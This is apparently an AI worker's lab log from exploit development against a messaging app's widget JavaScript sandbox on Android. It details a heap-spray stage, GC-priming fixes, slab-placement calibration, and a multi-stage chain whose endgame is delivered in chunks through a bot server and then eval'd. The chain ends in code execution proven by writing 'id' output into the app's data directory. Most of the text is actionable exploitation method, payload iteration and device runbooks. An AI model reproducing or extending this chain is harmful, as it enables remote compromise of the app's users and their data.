   * `S1 ABLEN[599]=327744 VLEN=327744 END=-` -> the corrected parser route
     works on 72801 without MTE.
   * `S1 NOCORR END=-` -> target slab mapped but not ours/phase missed; no
     crash.
   * crash at `0x17498c8`/`0x17498ec` with a foreign `var_name` -> the target
     page is still a foreign string page (placement); report the fault/`x10`.
2. **`lab/pixel72801_route2/payload/s2s3_device_72801.html`** — **9,064 raw /
   3,814 zlib9** — same stage A + dynamic Android endgame, only after the
   probe reports `ABLEN`.

### 12.5 Residual risk

A foreign target page is still fatal if its `var_name` is a wild index — that
data is not ours. What changed is that the *our-record* crash mode is gone
(tagged int), the heap is 1 MB smaller, and the layout has 32 fewer non-spray
slabs, all of which improve the chance that the +20-slab page is spray. If
the probe crashes in `JS_DupAtom` on a foreign `var_name`, the next step is
not a new N2 value but a placement change (drive `b`'s page into the spray
run; the eval's provisional bytecode block is what `b` reuses — see the
host `A512/F512` trace in §12.3).


---

## 14. Device result: probe HIT, first step-2 attempt (**superseded by §16**)

### 14.1 The corrected probe hit on the Pixel

`payload/s2s3_probe_72801.html` (1,566 raw / 686 zlib9) on the Pixel 72801,
MTE off, rendered **`S1 ABLEN[599]=327744 VLEN=327744 END=-`**.

**The parser route 2 is device-proven on the 72801 release without MTE**: the
class-512 `b`, the k-independent target (user 252 / data 228), the 479-char
class-512 string spray and the tagged-int record all work on the device.

### 14.2 The step-2 widget crashed in stage A (placement, not code)

`payload/s2s3_device_72801.html` (9,064 raw / 3,814 zlib9) crashed:
`SIGSEGV/SEGV_MAPERR`, fault `0x71f01fd738`, PC `0x174986c`,
`x12 = 0x71f00bd748 = b+0x110`, `x13 = 0x71f01fd734`, `x13-x12 = 0x13FFEC`,
fault `= x13+4`, `x10 = 0xfffe`, `x11 = 0xffff`. That is **stage A's OOB
read**, with the exact geometry, and the **+20-slab target unmapped** — the
larger page (extra 7.5 KB endgame script) changed the arena pre-heap, so the
slab 20 above `b` fell outside the sprayed run. The endgame was never
reached. (Same failure family as 16718/16720.)

### 14.3 Fix: keep stage A's pre-heap identical to the probe

Any JS text present in the page before stage A can perturb the arena (the
step-2 page had the endgame as an executable sibling `<script>`). The fixed
step 2 moves the endgame out of the executable stream:

```
<script id="stageA">  (byte-identical to the probe's stage A)  </script>
<script id="e" type="text/plain">  ENDGAME  </script>
<script id="stageC">  eval(#e.textContent) if MEGA undefined; then marker  </script>
```

* a `type="text/plain"` script is **not compiled** by a JS-script collector,
  and its content is CDATA (raw `<` is safe);
* if the engine evaluates every `<script>` in document order, the endgame
  runs **after** stage A (the desired order) and sets `MEGA`; stage C then
  skips the eval (guard `typeof MEGA=="undefined"`);
* if the engine skips non-JS types, stage C evals `#e.textContent` after
  stage A;
* if the text is not exposed at all, the marker degrades to `END=-` (no
  crash), and the stage A forge is still visible.

`payload/s2s4_device_72801.html` — **8,983 raw / 3,874 zlib9** (sha256
`06e9d8eb81c6b482…`). Host: stage A on the **exact file** gives
`ABLEN[599]=327744 VLEN=327744` **3/3** at 8 MiB and at 6 MiB (the host
shim does not expose the deferred text, so it prints `END=-`; the endgame
code itself is unchanged and is proven by `s2s3_full_host.html`
`END=HF OK` + 162 B proof 3/3).

### 14.4 Device test (one message)

Send **`lab/pixel72801_route2/payload/s2s4_device_72801.html`** as a new
widget message. Markers:
* `S1 ABLEN[599]=327744 … END=HF OK` -> full chain;
* `S1 ABLEN[599]=327744 … END=HF ERR <token>` -> stage A + endgame ran, the
  endgame failed at `<token>` (no crash);
* `S1 ABLEN[599]=327744 … END=-` -> stage A hit, the deferred text was not
  exposed/evaluated; the next step is inline delivery with a recalibrated
  spray (do not resend the old 9,064-byte step 2);
* a crash at `0x174986c` with `fault = b+1,310,832` -> the page's pre-heap
  still shifts the run; then the fallback is a larger pre-spray (NP 3200)
  with the endgame inline, tested as a separate message.


---

## 16. Step-2 placement: the GC mechanism, and the priming fix (2026-11-08 final)

### 16.1 The two step-2 crashes are GC artefacts, not geometry errors

| widget | size (zlib9) | device result |
|---|---|---|
| 16724 probe | 686 | **`ABLEN[599]=327744` HIT** |
| 16725 inline endgame | 3,814 | SEGV_MAPERR at `b+1,310,832` (target slab outside the run) |
| 16726 deferred endgame | 3,874 | SEGV_ACCERR on a **foreign class-512 page**, `var_name = 0x17ffffef` |

Both step-2 modes are stage A, and the only difference to the hitting probe is
the page's extra text. Host instrumentation of the fork's allocator
(`GCDBG`) shows why:

```
without priming:  GC size=1494016 a512=2603
                  GC size=2854032 a512=5203     <-- GC DURING the string spray
with priming:     (all GCs) a512=0               <-- GC-free spray
```

`js_trigger_gc()` is called from object/shape allocation; `JS_RunGC()`
then calls **`js_arena_trim()`**. A GC in the middle of the spray therefore
(a) destroys empty slabs -> **holes in the slab run** (the 16725 `MAPERR`)
and (b) returns GC-freed engine pages to the `free_arena_list[512]` ->
the eval's provisional bytecode and `b` land in an **engine page**
(the 16726 foreign `var_name`). The engine's pre-heap (bigger HTML, more
garbage) changes when the GC fires, hence probe-hit / step-2-crash.

### 16.2 Fix: force the GC before the spray ("GC priming")

Stage A now starts with ~30,000 short-lived objects (`{a,b,c,d}`), then drops
them. The last GC collects them **before** the first string allocation and
sets `malloc_gc_threshold = 1.5 x size` (~6.8 MB), so the whole spray and the
eval run **GC-free** (verified: every GC log line has `a512=0`). The spray
keeps NP=3600 (32 slabs, tolerating up to 12 engine-mixed pages) and
NQ=2600, and the inline endgame stays a sibling `<script>` after stage A.

### 16.3 Host validation of the exact step-2 HTML

`payload/s2s7_device_72801.html` — **9,168 raw / 3,874 zlib9** (sha256
`32c57afa1f707cf1…`):

| test | result |
|---|---|
| stage A on the exact file, 8 MiB, 3 runs | `ABLEN[599]=327744 VLEN=327744` **3/3** |
| stage A at 6 MiB | forges |
| full chain, host endgame, 3 runs | `END=HF OK` + **162 B proof**, 3/3 |
| GC during the spray | **none** (all `a512=0`) |
| runtime (host) | 34-41 ms (quota 300 ms) |
| heap | 4.56 MB transient (priming collection), 3.73 MB at trigger |

### 16.4 Device test

Send **`lab/pixel72801_route2/payload/s2s7_device_72801.html`** as a new
widget message. Markers: `S1 ABLEN[599]=327744 … END=HF OK` (full chain);
`… END=HF ERR <token>` (stage A + endgame ran, endgame failed);
`ABLEN … END=-` (not expected with an inline stage B). A crash at
`0x174986c` would mean a GC still fired inside the spray (then raise the
priming count to 45,000) — the old 3,814/3,874 step-2 files are superseded.


---

## 17. 16727: the 30k priming was too heavy; reduced priming (final step 2)

### 17.1 What the device showed

`s2s7_device_72801.html` (9,168 raw / 3,874 zlib9, 30k-object priming +
NP=3600 spray + inline endgame) rendered **`Widget stopped`** (engine stop,
app alive), and the app crashed later at 03:06:29 (PID 32270, widget.sandbox,
`SEGV_ACCERR`, fault `0xb400006fc070d5a8`, tagged). The `stopped (N): ...`
logcat line had rotated out.

### 17.2 Reading

* **The stop is the priming, not the spray.** Host tracing shows the GC
  trigger (`js_trigger_gc`, line 6468) fires on **object creation**, i.e. at
  the eval's function/shape allocations (`a512=2603`), not from the strings.
  The 30k `{a,b,c,d}` priming is ~120k property insertions + ~8 full GCs and
  a 4.56 MB live peak — by far the heaviest JS workload in any payload used
  on this device. Both a 300 ms CPU stop and a heap stop (4.56 MB priming +
  engine baseline against the widget limit) are consistent with the
  rotation-missing line; the fix is the same for both.
* **The 03:06 crash is not the endgame.** The endgame is fully inside
  `try/catch` and reports `HF ERR <token>`; it does not read `JS_DupAtom`.
  A `SEGV_ACCERR` on a **tagged** address is the foreign-page
  `JS_DupAtom` shape (16723/16726). With the widget stopped, the endgame
  never ran; the crash is the cold re-open re-executing stage A with a
  different heap (heap roulette), i.e. the same foreign/geometry family.

### 17.3 Reduced priming, same GC-free spray

The threshold only has to exceed the eval-time heap (~3.2 MB at NP=2600).
Priming with **3,000 objects carrying a 1 KB string** reaches ~3.0 MB live
with 3k object creations instead of 30k and 6 GCs instead of 8; the last GC
prints `size=2990696 a512=0`, so the spray and the eval stay GC-free.

`payload/s2s8_device_72801.html` — **9,175 raw / 3,876 zlib9** (sha256
`dda1ddb3d4719f76…`), NP=2600 / NQ=2600, class-512 `b`, tagged-int records,
inline endgame.

| host test | result |
|---|---|
| GCs | all `a512=0` (spray + eval GC-free), last at 2.99 MB -> threshold 4.48 MB |
| stage A on the exact file, 8 MiB, 3 runs | `ABLEN[599]=327744 VLEN=327744` 3/3 |
| stage A at 6 MiB | forges |
| full chain, host endgame, 2 runs | `END=HF OK` + **162 B proof** 2/2 |
| heap at trigger | 3.18 MB (was 3.73), priming peak 2.99 MB (was 4.56) |
| runtime (host) | 34-51 ms |

### 17.4 Device test

Send **`lab/pixel72801_route2/payload/s2s8_device_72801.html`** as a new
message. If it still stops, the reason to look for in logcat is
`stopped (N): CPU limit exceeded` vs `Memory limit exceeded`; the next lever
is the priming (3,000 -> 2,200 x 1 KB) or NP (2600 -> 2200). If it crashes
with a tagged `SEGV_ACCERR` at `0x17498ec`, it is the foreign-page family on
a cold/re-entrant run, not the endgame.


---

## 18. 16728 and the calibration decision (final)

### 18.1 16728

`s2s8_device_72801.html` (3k x 1 KB priming, NP=2600, inline endgame) crashed:
`SEGV_ACCERR` on a **tagged** address, PC `0x17498ec`, `x10 = 0x11000514`
(wild positive `var_name`), `x11 = 0xffff`, `x12 = 0x71f8c5c348 = b+0x110`,
`x24 = b = 0x71f8c5c238`. Same foreign class-512 page family as 16723
(`"NSs3"`) and 16726 (`0x17ffffef`). The 686-byte probe remains the only
hitting payload; every step-2 with the endgame in the HTML (inline or
deferred) has hit a foreign page.

### 18.2 Why the priming did not fix the device

The priming addresses the GC trigger (`js_trigger_gc` on object creation:
`a512=2603`), and it does keep the host spray/eval GC-free. It does **not**
address the *other* placement factor: with descending slab allocation the
+20 slab above `b` is the **20th slab from the bottom**, i.e. close to the
**top of the spray run**, where the spray's first pages have filled the
engine's partially-free class-512 pages (the "mixed prefix"). If the mixed
prefix is longer than `NP_slabs - 20`, the +20 slot is an engine page ->
foreign `var_name` -> `JS_DupAtom` fault. s2s8 had NP=2600 (23 slabs), so a
mixed prefix > 3 slabs already breaks it; the device is above that.

### 18.3 Options, and the choice

| option | verdict |
|---|---|
| device-side pre-heap/GC priming | **tried** (s2s7/s2s8). It fixes GC, not the mixed prefix; 16728 still hit a foreign page. Insufficient alone. |
| step-2 HTML byte-identical to the probe until after stage A | The engine collects widget scripts up front (`SandboxEngine_runScripts`, <=1000 scripts, `src=` skipped), so any in-HTML endgame is in the sandbox heap before stage A. A true post-forge delivery needs the `TelegramWidget.request` path (out-of-band). **Held as the fallback** if calibration fails. |
| two-phase across two widget messages | The runtime/AB does not survive (cold re-open re-executes the parser; the probe's own stop data shows this). **Rejected.** |
| different spray/class calibration for the exact device step-2 HTML | **Chosen**: NP=3600 (32 slabs) with the light 3k priming. This is not a blind sweep: it follows directly from the mixed-prefix model and s2s8's failure (prefix > 3 slabs); it tolerates up to ~12 mixed slabs while keeping the priming light (2.99 MB live, 3k objects). |

### 18.4 Candidate and host validation

`payload/s2s9_device_72801.html` — **9,175 raw / 3,877 zlib9** (sha256
`d85d77fb66db8ec2…`), 3k x 1 KB priming + NP=3600/NQ=2600 + inline endgame.

| host test | result |
|---|---|
| GCs | all `a512=0` (spray/eval GC-free), last at 2.99 MB |
| geometry | `t_slab_idx=15`, `b_slab_idx=35`, delta 1,310,720, target slot 9, **TSLOTS 0..15 = 512** |
| stage A on the exact file, 8 MiB, 3 runs | `ABLEN[599]=327744 VLEN=327744` **3/3** |
| stage A at 6 MiB | forges |
| full chain, host endgame, 2 runs | `END=HF OK` + **162 B proof** 2/2 |
| heap at trigger | 3.73 MB; priming peak 2.99 MB |

### 18.5 Device test and the decision rule

Send **`payload/s2s9_device_72801.html`** as a new message.
* `ABLEN[599]=327744 … END=HF OK` -> full chain.
* `ABLEN … END=HF ERR <token>` -> stage A + endgame ran; endgame only.
* foreign-page crash (`0x17498ec`, wild positive `var_name`) -> the in-HTML
  calibration is exhausted (two models tried); the next step is the
  **out-of-band endgame**: keep the probe HTML byte-identical and fetch the
  endgame after the forge via `TelegramWidget.request` (<=1024 B/answer,
  8 chunks, 5 s pacing), with the orchestrator serving it on the LAN.
* `Widget stopped` -> read `stopped (N): CPU/Memory` and lower NP by 400 or
  the priming to 2,200.


---

## 19. 16729: NOCORR (safe) -> string priming, probe-like layout

### 19.1 What 16729 says

`s2s9_device_72801.html` (3k-object priming, NP=3600) on the device:
**`S1 NOCORR END=HF ERR NOV`** — no crash. So NP=3600 removed the
foreign/geometry modes (the +20 slab is now mapped and its record is safe),
and stage A completed (the endgame ran and failed with `NOV`, as expected
without a forged victim). The remaining miss is the **record/phase/slot**:
the target page is safe but not our record.

The difference to the device-proven probe is the **object priming**: 3,000
`{a,s}` objects + 3,000 1 KB strings allocate arena objects and a GC before
the spray, which shifts the slab layout; the probe (no priming) hit.

### 19.2 The fix: prime the GC with Scudo strings, not arena objects

`js_trigger_gc` only runs on **object creation**, so one object after a large
*string* allocation is enough to force the GC before the spray:

```
var GG = new Array(1500);
for (var i = 0; i < 1500; i++) GG[i] = "x".repeat(2048);   // 3 MB, Scudo (not arena)
var G0 = {};                                                // triggers the GC check
GG = null; G0 = null;
```

Host trace: **one** GC, `size=3259976 a512=0` -> threshold 4.9 MB, then the
spray and the eval are **GC-free**; the arena is almost untouched (the 2 KB
strings are large blocks, not class-512 arena blocks), so the layout stays
probe-like. NP stays at the probe's 2600.

### 19.3 Candidate and host validation

`payload/s2s10_device_72801.html` — **9,187 raw / 3,881 zlib9** (sha256
`89b96e94de77585e…`), string priming + NP=2600/NQ=2600 + inline endgame.

| host test | result |
|---|---|
| GC | one pre-spray GC (3.26 MB, `a512=0`); spray/eval GC-free |
| geometry | `t_slab_idx=6`, `b_slab_idx=26`, delta 1,310,720, target slot 10, **TSLOTS 0..15 = 512** |
| stage A on the exact file, 8 MiB, 3 runs | `ABLEN[599]=327744 VLEN=327744` **3/3** |
| stage A at 6 MiB | forges |
| full chain, host endgame, 2 runs | `END=HF OK` + **162 B proof** 2/2 |
| heap at trigger | 3.18 MB; priming peak 3.26 MB (Scudo) |

### 19.4 Device test

Send **`payload/s2s10_device_72801.html`** as a new message.
* `ABLEN[599]=327744 … END=HF OK` -> full chain.
* `ABLEN … END=HF ERR <token>` -> stage A + endgame ran; endgame only.
* `NOCORR … END=HF ERR NOV` again -> the in-HTML record path is not landing;
  the next step is the **out-of-band endgame** with the probe's exact HTML
  (`TelegramWidget.request`, <=1024 B/answer) — do not add more in-HTML text.
* any crash -> report the register set; a foreign `var_name` at `0x17498ec`
  would mean the pre-spray GC did not stabilise the layout.


---

## 20. Out-of-band endgame — implemented and host-validated (approved design)

16730 (`s2s10`, Scudo-string priming, NP=2600) again gave a safe
`NOCORR END=HF ERR NOV`: the in-HTML endgame text is the invariant that
breaks the placement. **All in-HTML calibration is exhausted**; the stage A
logic/offset/class/atom are device-proven by the 686-byte probe.

**Design** (`lab/pixel72801_route2/oob/DESIGN.md`): the widget is the probe's
exact stage A (byte-identical, 1,059 B, sha256 `87434fa765acf8aa…`) plus a
fetch driver in stage C — **no endgame text in the page** (2,006 raw /
**963 zlib9**). After the forge the driver calls
`TelegramWidget.request("E0")…("E7")`, one chunk per answer (<=1024 B, 950 B
slices of the 7,469 B endgame), 5.2 s background pacing, then joins,
length-checks and `eval`s the source in the same runtime (V/VAB are globals).

Engine path (verified statically): request data 1..64 B, `can_query` from
sendWidget `allow_queries`, the no-tap path needs `background_query` and a
**visible** widget, one in flight, >=5 s background pacing
(`sub_79A798`, statuses 1/4/6/7/8), answer <=1024 B, bot answer wire method
`messages.setBotWidgetQueryAnswer` (client fetch
`messages.getBotWidgetQueryAnswer`; update `updateBotWidgetQuery`; DEX
`classes.dex` 0x9368e9/0x9393c7). The one open item is the HTTP-facing beta
Bot API method name (`answerWidgetQuery` vs `setBotWidgetQueryAnswer`).

Host validation (no device): stage A byte-identical to the probe; the widget
forges and reports `NOAPI` without the API; a mock `TelegramWidget.request`
serving the host endgame in 950-B chunks makes the driver assemble and eval
it -> `S1 ABLEN[599]=327744 VLEN=327744 | HF HF OK` + **162 B proof**, 3/3.

Not executed: per the user's policy, bot/network payload delivery needs
explicit approval. The design is ready for review; no device action was
taken.


**Implementation status (2026-11-08, after user approval of the bot answers):**

* Widget `oob/s2oob_device_72801.html` — **2,103 raw / 1,011 zlib9**: the
  probe's stage A byte-identical + a 945-B fetch driver in stage C; no
  endgame text. The driver never throws: a miss is retried 3x and shown as
  `F<i>`/`X<i>`; a length mismatch shows `LEN n` and never evals.
* `oob/bot_server.py` (stdlib): `getUpdates` long-poll with a persisted
  offset, uid 10290 filter, `E<i>` parsing, `answerWidgetQuery(query_id,
  result=chunk)`; `--self-test` (offline) **PASS**, `--dry-run` logs only.
  `oob/bot_config.example.json` has the exact `sendWidget` body
  (`allow_queries=true`, `background_query=true`) and server invocation.
* `oob/chunks/`: 8 answers (7 x 950 + 819 = 7,469 B, source sha256
  `5200636a47720fe8…`), manifest with per-chunk hashes.
* Host validation: no-API widget -> `ABLEN[599]=327744 | NOAPI`; mock
  request serving the host endgame in 950-B chunks -> `ABLEN[599]=327744 |
  HF HF OK` + **162 B proof 3/3**; rejection -> `X3`; empty answer -> `F2`
  (no crash in either).
* **Beta API confirmed** from the orchestrator's working `bot.py` (which
  already answered widget queries): update field `widget_query` (also
  `shared_widget_query`), query dict `{id, from, data, chat, widget_id,
  message_id}`; answer method **`answerWidgetQuery`** with
  **`widget_query_id`** plus the chunk field (`result`, fallback
  `text`/`data`, auto-tried and remembered). The wire method is
  `messages.setBotWidgetQueryAnswer` (DEX 0x9393c7).
* Server modes: `--self-test` (offline PASS), `--simulate` (offline, 8 dry
  answers), `--probe` (confirms the method exists with a bogus query id, no
  widget needed), `--dry-run`, live. **One `getUpdates` consumer per token**
  (stop `bot.py` first, else 409 Conflict).
* `oob/RUNBOOK.md` is the live-run package: exact server command (token from
  `/tmp/opencode/tgbot/token.env`), the exact `sendWidget` body
  (`allow_queries: true`, `background_query: true`, chat <CHAT_ID>), the
  sequence, the expected marker/proof, the failure tokens and the logcat
  greps.
* **Device run 16807 and the F0 fix (exact answer contract).** Stage A was
  device-proven again (`S1 ABLEN[599]=327744 VLEN=327744`, no crash), but the
  first chunk came back empty at the widget (`F0`) while the server log said
  `FIELD result accepted` `ok=True`. Root cause found in the release 72801
  sandbox bundle (`assets/WidgetSandbox/WidgetJS/sandbox-bundle.js`):
  `TelegramWidget.request()` **resolves `Object.freeze({result:
  string|null})`** (`j1()`), not the raw string; a result that is not text or
  is over **1024 bytes** rejects with `INVALID_ANSWER`. The TL/Java path is
  `TL_messages_botWidgetQueryAnswer.result` -> `o.A()` (empty->null) ->
  UTF-8 bytes -> `WidgetSandboxNative.answerRequest`. **The server was
  correct** (`answerWidgetQuery(widget_query_id, result)`); the driver was
  reading the object as the answer. Driver fixed to use `a.result` (string
  fallback kept). Widget now 2,151 raw / **1,024 zlib9** (stage A still
  byte-identical). Host: `{result: chunk}` mock -> `HF HF OK` + 162 B proof
  3/3; raw string -> OK; `{result:null}` -> `F0`; rejection -> `X3`; empty
  -> `F2`.
* **16808 and the `F0` resolution (server-side, exact).** The driver fix was
  in, the server logged `ANSWER … field=result ok=True`, yet the client
  still resolved `{result: ""}`. Root cause: **the Bot API parameter is
  `data`, not `result`** — `lab/qjs_fork_audit/widget-sandbox/docs/
  tgw-format.md` ("`result` | `answerWidgetQuery`'s `data`", checked against
  the beta 2026-10-28). The beta ignores the unknown `result` parameter and
  returns `ok=True` with an empty answer. Server fixed:
  `answerWidgetQuery(widget_query_id, data=<chunk>)`, fields order
  `data,result,text`. Timing facts from the same source: the bot must answer
  within **15 s** (`WIDGET_RESPONSE_TIMEOUT`), the query id expires after
  15 s, and >5 requests/5 s per user+bot hits `FLOOD_WAIT` (the driver's
  5.2 s pacing is inside). The server logs `LATENCY` (poll return -> answer)
  and `RT` (API round trip). **No widget change**: the `.result` extraction
  was already right. A diagnostic widget (`oob/s2oob_diag_72801.html`, 848
  zlib9) prints `T=object K=result RT=string L=… H=…` if a run ever needs
  the raw shape.
* The orchestrator runs the Pixel test (server + sendWidget with
  `allow_queries`/`background_query`, widget visible ~36 s); this worker
  executed nothing.


---

## 21. Optimized package: deterministic-ish stage A + ~1 s inline endgame

Goals: one open = one hit, ~1 s end-to-end, no retries, no server for the main
path. Host-side only; the orchestrator runs the Pixel/Sony tests.

### 21.1 Stage A v3 (the heap lottery, attacked structurally)

`oob/stageA_v3.js` = the device-proven probe logic + two changes:

1. **Scudo-string GC priming** (1500 x 2 KB + one object): one GC before the
   spray (host: `size=3259976 a512=0`), so the spray and the eval are
   GC-free. This removes `js_arena_trim` holes and GC-freed engine pages
   during the eval, which is what moved `b` off our page (16723/16726/16728).
2. **NP=4000 / NQ=2600** (was 2600/2600): 35 pre-spray slabs. The +20 slab
   above `b` is a slab created by our spray (all 16 slots class 512) as long
   as the number of engine partially-free class-512 slabs `S` satisfies
   `(NP/7 - S)/16 >= 20`, i.e. **S <= 251** (NP=2600 gave only S <= 51; the
   observed misses imply S > 51 or an eval-time GC). The target page is then
   ours for **any** slot index, so the read is our RJ record (tagged-int
   `var_name`, no atom dependence) and a miss degrades to a safe `NOCORR`,
   not a foreign-page crash.

Single trigger (no phase sweep; the class-512 target offset is
k-independent: user 252 / data 228). Host: one GC pre-spray, spray/eval
GC-free, `ABLEN[599]=327744` 3/3, heap 3.94 MB at trigger.

### 21.2 Inline endgame = the ~1 s path

A single `answerWidgetQuery` is capped at 1024 B and the client allows at
most **5 requests / 5 s per user+bot** (docs/tgw-format.md), so a fetched
endgame can carry at most ~4.75 KB in the first window — less than the
7.5 KB dynamic resolver. **The ~1 s path is therefore the inline endgame**:
stage A and the endgame in the same page, no requests at all.

`oob/s2v3_device_72801.html` — **9,186 raw / 3,883 zlib9** (stage A v3 +
the 7,469 B dynamic Android endgame + marker). Host full chain with the host
endgame: `END=HF OK` + 162 B proof; wall time **154-158 ms** including
process start (device estimate ~0.5 s).

### 21.3 Fallback: burst out-of-band (≈6 s)

If the inline page's pre-heap still breaks the stage A on some run, the
probe's exact stage A + the out-of-band driver with a **burst** schedule:
E0..E4 back-to-back (5 requests = the 5/5 s allowance), one 5.2 s wait, then
E5..E7 -> eight 950-B chunks in **~6 s** instead of 40 s.
`oob/s2oob_burst_device_72801.html` — 2,151 raw / 1,025 zlib9; host mock
`{result: chunk}` end-to-end `HF HF OK` + 162 B proof 2/2.

### 21.4 Device sequence

1. **Pixel (primary)**: send `oob/s2v3_device_72801.html` as a new message
   (no server needed), open it, keep it visible. Expect
   `S1 ABLEN[599]=327744 VLEN=327744 END=HF OK` within ~1 s; proof
   `id>/data/data/org.telegram.messenger/files/n1`.
2. **Sony (stage-A calibration, faster testbed)**: the same widget N times;
   count `ABLEN` vs `NOCORR`. `NOCORR` is safe by construction (our page,
   wrong phase) and `HF ERR NOV` follows; any crash would contradict the
   S<=251 model and mean an engine prefix larger than 251 slabs/16 pages.
3. **Fallback if the Pixel v3 misses**: `oob/s2oob_burst_device_72801.html` +
   `bot_server.py` (data field) -> eight chunks in ~6 s.

Expected markers: `ABLEN[599]=327744 ... END=HF OK` (primary);
`... | G1/8 ... G8/8 | HF HF OK` (fallback); safe failure
`ABLEN ... END=HF ERR NOV` (miss) — never a crash on our page.


## 22. Limits

* Host measurements are x86-64 Linux; the slab direction on that host is
  descending, so the *post-spray* branch is design-symmetric but not
  host-exercised.
* The slot-class and phase geometry of the device run are not observable
  from the tombstone (no memory map was captured); §4/§5 define the exact
  follow-up for each outcome.
* MTE-on is not tested here; the stage A is tag-0 → tag-0 throughout
  (arena only), so the port is the same payload for the later MTE-on run.

---

## 23. Parallel universal fan-out — supersedes the single-widget calibration (2026-11-08)

The single-widget H calibration (§18–§21) is replaced by a **parallel
self-probing fan-out**: K fixed widget messages (K=4) whose stage A sweeps two
H values each (GC re-arm between attempts), all in separate sandboxes
(4–7 `widget.sandbox` threads, per-view runtimes; §1.1 of the new note), with
the endgame exclusively on the answer channel. The same four payloads are
sent to every device; there is no calibration message and no device constant.

- Full design, thread-model evidence, async-pacing analysis and the honest
  single-answer verdict: `notes/universal_parallel_20261108.md`.
- Payloads + host matrix + first-wins server:
  `lab/parallel_univ_20261108/` (12/12 `ABLEN … | HF HF OK`, re-arm 3/3
  `ATT=1`, 6 MiB forge, STOP path, self-test PASS).
- Facts: `notes/LEMMALOG_FACTS_parallel_20261108.txt`.
- The device order is Sony first (faster testbed), then the Pixel; the `T0`
  stamps in the markers measure whether the four sandboxes started together
  on one open.

